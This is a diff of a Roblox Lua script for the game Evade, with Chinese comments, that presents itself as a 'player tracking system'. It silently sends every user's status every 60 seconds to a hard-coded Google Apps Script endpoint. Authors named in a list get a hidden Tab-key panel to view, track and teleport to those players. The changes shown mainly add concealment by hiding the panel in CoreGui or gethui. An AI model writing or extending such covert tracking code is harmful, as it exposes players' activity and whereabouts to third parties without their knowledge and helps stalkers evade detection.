@@ -1,14 +1,13 @@
 --[[
-   🔑 Evade 玩家追蹤系統 (整合版)
-   - 普通用戶：每60秒後台上報狀態
-   - 作者：按 Tab 打開管理面板，查看線上玩家、追蹤、複製ID
-   - 雙帳號顯示問題已通過強化 GAS 修復
+   🔑 Evade 玩家追蹤系統 (最終修復版)
+   - 普通用戶：每60秒後台上報
+   - 作者：按 Tab 打開管理面板（使用 CoreGui 增強隱蔽）
 --]]
 
 -- ==================== 配置區 ====================
-local AUTHORIZED_USERS = { "xuan_1529", "0xzzyi", "E5alR9" }  -- 作者列表
+local AUTHORIZED_USERS = { "xuan_1529", "0xzzyi", "E5alR9" }
 local GAS_URL = "https://script.google.com/macros/s/AKfycbxYRivp31xlrBQtgoFOGfNMl-Ks97RtzhYhDdUdY40bKGzfIu3P2_bRdp8pSUrTPaKGww/exec"
-local REPORT_INTERVAL = 60  -- 上報間隔（秒）
+local REPORT_INTERVAL = 60
 local PANEL_KEY = Enum.KeyCode.Tab
 
 -- ==================== 環境初始化 ====================
@@ -17,7 +16,6 @@ local TeleportService = game:GetService("TeleportService")
 local UIS = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
-local PlayerGui = lp:WaitForChild("PlayerGui")
 
 -- 檢查 HTTP 請求函數
 local req = syn and syn.request or http_request or request or (http and http.request)
@@ -108,7 +106,7 @@ end
 
 -- 啟動上報循環（所有人）
 task.spawn(function()
-    reportStatus()  -- 立即執行一次
+    reportStatus()
     while true do
         task.wait(REPORT_INTERVAL)
         reportStatus()
@@ -118,26 +116,39 @@ end)
 -- ==================== 作者專屬：管理面板 ====================
 if not isAuthor then return end  -- 普通用戶到此為止
 
+-- 嘗試獲取最隱蔽的容器
+local container = nil
+if syn and syn.protect_gui then
+    container = game:GetService("CoreGui")
+    print("[面板] 使用 CoreGui (syn)")
+elseif gethui then
+    container = gethui()
+    print("[面板] 使用 gethui")
+else
+    container = lp:WaitForChild("PlayerGui")
+    print("[面板] 使用 PlayerGui")
+end
+
 -- 通知系統
 local function showNotice(msg)
-    local sg = PlayerGui:FindFirstChild("EvadeNotice") or Instance.new("ScreenGui", PlayerGui)
+    local sg = container:FindFirstChild("EvadeNotice") or Instance.new("ScreenGui", container)
     sg.Name = "EvadeNotice"
     sg.ResetOnSpawn = false
     sg.DisplayOrder = 9998
-    local container = Instance.new("Frame", sg)
-    container.Size = UDim2.new(0, 300, 0, 40)
-    container.Position = UDim2.new(0.5, -150, 0.1, 0)
-    container.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    container.BackgroundTransparency = 0.4
-    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 8)
-    local label = Instance.new("TextLabel", container)
+    local noticeFrame = Instance.new("Frame", sg)
+    noticeFrame.Size = UDim2.new(0, 300, 0, 40)
+    noticeFrame.Position = UDim2.new(0.5, -150, 0.1, 0)
+    noticeFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    noticeFrame.BackgroundTransparency = 0.4
+    Instance.new("UICorner", noticeFrame).CornerRadius = UDim.new(0, 8)
+    local label = Instance.new("TextLabel", noticeFrame)
     label.Size = UDim2.new(1, 0, 1, 0)
     label.BackgroundTransparency = 1
     label.TextColor3 = Color3.new(1, 1, 1)
     label.TextSize = 16
     label.Font = Enum.Font.GothamBold
     label.Text = msg
-    task.delay(3, function() container:Destroy() end)
+    task.delay(3, function() noticeFrame:Destroy() end)
 end
 
 -- 智能傳送
@@ -155,13 +166,14 @@ local function safeTeleport(targetUserId, targetJobId)
     return true
 end
 
--- 建立 UI 面板
-local screenGui = Instance.new("ScreenGui", PlayerGui)
+-- 建立 UI 面板（多重容錯）
+local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "NotificationUI"
 screenGui.Enabled = false
 screenGui.ResetOnSpawn = false
 screenGui.DisplayOrder = 9999
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+screenGui.Parent = container
 
 local mainFrame = Instance.new("Frame", screenGui)
 mainFrame.Size = UDim2.new(0, 380, 0, 500)
@@ -195,8 +207,7 @@ playerList.ScrollBarThickness = 2
 playerList.ZIndex = 10
 Instance.new("UIListLayout", playerList).Padding = UDim.new(0, 8)
 
-screenGui.Enabled = false
-task.delay(0.5, function() if screenGui then screenGui.Enabled = false end end)
+print("[面板] UI 框架已建立")
 
 -- 玩家列表緩存
 local cachedPlayers = {}
@@ -312,13 +323,13 @@ end
 task.spawn(function()
     updateCache()
     while true do
-        task.wait(90)  -- 每90秒刷新一次
+        task.wait(90)
         updateCache()
         if screenGui.Enabled then renderPlayerList() end
     end
 end)
 
--- UI 定時刷新（僅當面板開啟時）
+-- UI 定時刷新
 local uiRefreshLoop = nil
 local function startUIRefresh()
     if uiRefreshLoop then return end
@@ -334,7 +345,7 @@ local function stopUIRefresh()
     if uiRefreshLoop then task.cancel(uiRefreshLoop); uiRefreshLoop = nil end
 end
 
--- Tab 鍵切換面板
+-- Tab 鍵切換
 UIS.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     if input.KeyCode == PANEL_KEY then
